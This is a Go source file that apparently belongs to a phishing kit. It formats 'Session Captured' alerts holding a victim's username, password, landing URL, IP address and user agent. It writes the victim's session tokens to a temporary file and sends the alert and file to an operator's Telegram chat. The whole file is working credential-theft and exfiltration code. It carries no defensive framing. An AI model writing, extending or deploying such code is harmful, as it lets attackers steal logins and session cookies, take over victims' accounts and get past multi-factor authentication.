package main

import (
    "encoding/json"
    "fmt"
    "math/rand"
    "os"
    "path/filepath"
    "sync"
    "time"
)

// Simplified token struct for flat token only
type Token struct {
    Name           string  `json:"name"`
    Value          string  `json:"value"`
    ExpirationDate *int64  `json:"expirationDate,omitempty"`
}

// Session struct example (add other relevant fields as needed)
type Session struct {
    ID          string
    Username    string
    Password    string
    LandingURL  string
    UserAgent   string
    RemoteAddr  string
    CreateTime  int64
    UpdateTime  int64
    Tokens      []Token
}

// Generate a random string for filenames
func generateRandomString() string {
    rand.Seed(time.Now().UnixNano())
    const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    length := 10
    b := make([]byte, length)
    for i := range b {
        b[i] = charset[rand.Intn(len(charset))]
    }
    return string(b)
}

// Create txt file from session tokens JSON
func createTxtFile(session Session) (string, error) {
    txtFileName := generateRandomString() + ".txt"
    txtFilePath := filepath.Join(os.TempDir(), txtFileName)

    txtFile, err := os.Create(txtFilePath)
    if err != nil {
        return "", fmt.Errorf("failed to create text file: %v", err)
    }
    defer txtFile.Close()

    // Marshal tokens to JSON
    tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
    if err != nil {
        return "", fmt.Errorf("failed to marshal tokens: %v", err)
    }

    _, err = txtFile.WriteString(string(tokensJSON))
    if err != nil {
        return "", fmt.Errorf("failed to write to file: %v", err)
    }

    return txtFilePath, nil
}

// Format session info text message for Telegram (no tokens inside message body)
func formatSessionMessage(session Session) string {
    return fmt.Sprintf(
        "✨ Session Captured ✨\n\n"+
            "👤 Username:      ➖ %s\n"+
            "🔑 Password:      ➖ %s\n"+
            "🌐 Landing URL:   ➖ %s\n\n"+
            "🖥️ User Agent:    ➖ %s\n"+
            "🌍 Remote IP:     ➖ %s\n"+
            "🕒 Create Time:   ➖ %s\n"+
            "🕔 Update Time:   ➖ %s\n\n"+
            "📦 Tokens are attached in the file.",
        session.Username,
        session.Password,
        session.LandingURL,
        session.UserAgent,
        session.RemoteAddr,
        time.Unix(session.CreateTime, 0).Format(time.RFC1123),
        time.Unix(session.UpdateTime, 0).Format(time.RFC1123),
    )
}

// Global synchronization
var (
    processedSessions = make(map[string]bool)
    sessionMessageMap = make(map[string]int)
    mu                sync.Mutex
)

// Notify sends session to Telegram only if tokens present
func Notify(session Session) {
    config, err := loadConfig()
    if err != nil {
        fmt.Println("Load config error:", err)
        return
    }

    // Do not send if no tokens exist
    if len(session.Tokens) == 0 {
        fmt.Println("No tokens present for session:", session.ID)
        return
    }

    mu.Lock()
    if processedSessions[session.ID] {
        mu.Unlock()
        fmt.Println("Session already processed:", session.ID)
        return
    }
    processedSessions[session.ID] = true
    mu.Unlock()

    txtFilePath, err := createTxtFile(session)
    if err != nil {
        fmt.Println("Error creating tokens file:", err)
        return
    }
    defer os.Remove(txtFilePath)

    message := formatSessionMessage(session)

    messageID, err := sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message, txtFilePath)
    if err != nil {
        fmt.Println("Telegram send error:", err)
        return
    }

    mu.Lock()
    sessionMessageMap[session.ID] = messageID
    mu.Unlock()

    fmt.Println("Session notification sent for session:", session.ID)
}
